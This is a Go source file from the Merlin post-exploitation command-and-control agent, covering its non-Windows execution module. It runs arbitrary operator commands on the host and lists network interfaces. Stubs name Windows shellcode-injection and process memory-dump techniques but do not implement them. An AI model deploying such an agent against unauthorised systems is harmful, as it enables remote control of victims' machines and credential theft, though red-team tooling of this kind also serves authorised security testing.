// +build !windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"errors"
	"fmt"
	"net"
	"os/exec"

	// 3rd Party
	"github.com/mattn/go-shellwords"
)

// ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	argS, errS := shellwords.Parse(arg)
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	cmd = exec.Command(name, argS...) // #nosec G204

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// Ifconfig can be implemented in *non-windows hosts using Native go commands
func Ifconfig() (stdout string, stderr string) {
	ifaces, err := net.Interfaces()
	if err != nil {
		stderr = "There was an error getting network interface information"
	}
	stdout = ""
	for _, i := range ifaces {
		stdout += fmt.Sprintf("%s\n", i.Name)
		stdout += fmt.Sprintf("  MAC Address\t%s\n", i.HardwareAddr.String())
		addrs, err := i.Addrs()
		if err != nil {
			stderr = "There was an error getting network interface information"
		}
		for _, a := range addrs {
			stdout += fmt.Sprintf("  IP Address\t%s\n", a.String())
		}
	}
	return stdout, stderr
}

// WinExec is only a valid function on Windows agents
func WinExec(command string, args string, ppid int) (stdout string, stderr string) {
	return "", "Windows API is not implemented for this operating system"
}

// Netstat is only a valid function on Windows agents...for now
func Netstat(filter string) (stdout string, stderr string) {
	return "", "Netstat is not implemented for this operating system"
}

// Pipes is only a valid function on Windows agents
func Pipes() (stdout string, stderr string) {
	return "", "Listing named pipes is not implemented for this operating system"
}

// Ps is only a valid function on Windows agents...for now
func Ps() (stdout string, stderr string) {
	return "", "Process listing is not implemented for this operating system"
}

// Uptime is only a valid function on Windows agents...for now
func Uptime() (stdout string, stderr string) {
	return "", "Uptime is not implemented for this operating system"
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeSelf(shellcode []byte) error {
	shellcode = nil
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeCreateProcessWithPipe creates a child process, redirects STDOUT/STDERR to an anonymous pipe, injects/executes shellcode, and retrieves output
func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args string) (stdout string, stderr string, err error) {
	sc = ""
	spawnto = ""
	args = ""
	return stdout, stderr, fmt.Errorf("CreateProcess modules in not implemented for this operating  system")
}

// miniDump is a Windows only module function to dump the memory of the provided process
//lint:ignore SA4009 Function needs to mirror exec_windows.go and inputs must be used
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	tempDir = ""
	process = ""
	inPid = 0
	return mini, errors.New("minidump doesn't work on non-windows hosts")
}
